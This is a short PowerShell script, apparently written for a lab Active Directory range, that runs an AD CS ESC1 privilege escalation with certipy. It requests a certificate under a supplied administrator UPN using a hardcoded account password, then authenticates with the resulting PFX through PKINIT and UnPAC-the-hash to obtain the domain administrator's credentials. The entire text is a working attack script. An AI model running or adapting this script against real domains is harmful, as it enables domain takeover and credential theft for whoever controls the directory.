# T050 ESC1 - certipy req + auth as chief_command (Rule 1 direct ws01 SSH)
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Remove-Item C:\Tools\cadre-attack\administrator.pfx -ErrorAction SilentlyContinue

Write-Output "=== certipy req ESC1 (upn=administrator, web enrollment) ==="
& $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -dc-ip 192.168.77.10 -web -http-scheme http 2>&1 | Select-Object -Last 20
Write-Output "req_rc=$LASTEXITCODE"

if (Test-Path C:\Tools\cadre-attack\administrator.pfx) {
  Write-Output "=== certipy auth (PKINIT + UnPAC-the-hash) ==="
  & $certpy auth -pfx C:\Tools\cadre-attack\administrator.pfx -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 18
  Write-Output "auth_rc=$LASTEXITCODE"
} else {
  Write-Output "NO_PFX"
}
Write-Output "=== ESC1_DONE ==="
